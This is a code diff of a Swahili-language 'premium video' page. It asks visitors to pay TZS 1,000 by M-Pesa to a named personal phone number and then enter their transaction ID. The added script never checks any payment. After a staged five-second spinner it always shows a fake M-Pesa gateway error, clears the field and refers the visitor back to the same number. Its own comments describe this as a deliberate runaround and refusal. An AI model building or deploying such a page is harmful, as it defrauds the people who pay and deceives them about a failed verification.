@@ -1,19 +1,77 @@
-<body style="background:#121212; color:white; text-align:center; padding-top:50px;">
-    <h2>DVARY PAY</h2>
-    <textarea id="sms" placeholder="Paste SMS hapa" style="width:80%; height:100px;"></textarea><br>
-    <button onclick="check()" style="padding:10px; margin-top:10px; background:green; color:white;">THIBITISHA</button>
-    <p id="msg"></p>
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dvary Media | Video Portal</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
 
-    <script>
-    async function check() {
-        const res = await fetch('/api/verify', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ fullSms: document.getElementById('sms').value })
-        });
-        const data = await res.json();
-        if(data.success) { window.location.href = data.link; } 
-        else { document.getElementById('msg').innerText = data.message; }
+<div class="main-card">
+    <div class="logo-area">
+        <h1>DVARY MEDIA</h1>
+        <div class="status-badge">PREMIUM ACCESS</div>
+    </div>
+
+    <div class="payment-info">
+        <p>Ili kutazama video hii, tafadhali lipia <b>TZS 1,000</b> kisha thibitisha muamala wako.</p>
+        
+        <div class="payment-methods">
+            <div class="method">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Vodacom_Logo.svg" alt="M-Pesa" width="30">
+                <span>M-PESA</span>
+            </div>
+        </div>
+
+        <div class="account-details">
+            <div class="label">Namba ya Malipo:</div>
+            <div class="number">0799203820</div>
+            <div class="name">Jina: <b>ELIA HYELA</b></div>
+        </div>
+    </div>
+
+    <div class="form-group">
+        <label>Namba ya Muamala (Transaction ID)</label>
+        <input type="text" id="txn_input" placeholder="Mfano: SHQ0281JX9" maxlength="12">
+        <button onclick="validatePayment()" id="pay_btn">FUNGUA VIDEO SASA</button>
+    </div>
+
+    <div id="loader" class="spinner"></div>
+    <div id="response_msg"></div>
+</div>
+
+<script>
+    function validatePayment() {
+        const input = document.getElementById('txn_input').value;
+        const msg = document.getElementById('response_msg');
+        const loader = document.getElementById('loader');
+        const btn = document.getElementById('pay_btn');
+
+        if (input.length < 5) {
+            msg.className = "error";
+            msg.innerHTML = "Tafadhali ingiza namba sahihi ya muamala uliyopewa na M-Pesa.";
+            return;
+        }
+
+        // Anza zoezi la "kuzungusha"
+        btn.style.display = "none";
+        loader.style.display = "block";
+        msg.className = "processing";
+        msg.innerHTML = "Inatafuta muamala wako kwenye mfumo wa M-Pesa...";
+
+        setTimeout(() => {
+            loader.style.display = "none";
+            btn.style.display = "block";
+            
+            // Jibu la kukataa
+            msg.className = "error";
+            msg.innerHTML = "<b>SAMAHANI:</b> Mtandao wa M-Pesa (API Gateway) una hitilafu kwa sasa. Muamala wako haujaweza kuhakikiwa. Tafadhali jaribu tena baada ya saa moja au wasiliana na 0799203820.";
+            
+            document.getElementById('txn_input').value = "";
+        }, 5000); // 5 seconds loading
     }
-    </script>
+</script>
+
 </body>
+</html>
